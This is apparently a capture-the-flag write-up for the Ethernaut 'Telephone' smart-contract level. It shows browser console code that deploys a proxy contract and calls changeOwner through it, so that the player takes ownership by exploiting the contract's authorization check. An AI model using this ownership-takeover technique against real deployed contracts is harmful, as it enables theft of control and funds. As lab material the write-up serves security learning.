# Telephone

Type in the browser console:

```
> await contract.owner() == player
false
```

Deploy a contract with Remix using attached Solidity files ([interfaces/ITelephone.sol](./src/interfaces/ITelephone.sol) and [contracts/TelephoneProxy.sol](./src/contracts/TelephoneProxy.sol))

Copy the ABI and deployed contract address from Remix and run the following code in the browser console:

```
var abi = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_owner",
        "type": "address"
      }
    ],
    "name": "changeOwner",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_telephoneAddress",
        "type": "address"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  }
];
var proxyAddress = "*redacted*";
var proxyContract = new web3.eth.Contract(abi, proxyAddress);
await proxyContract.methods.changeOwner(player).send({ from: player });
```

Type in the browser console:

```
> await contract.owner() == player
true
```

Level finished.
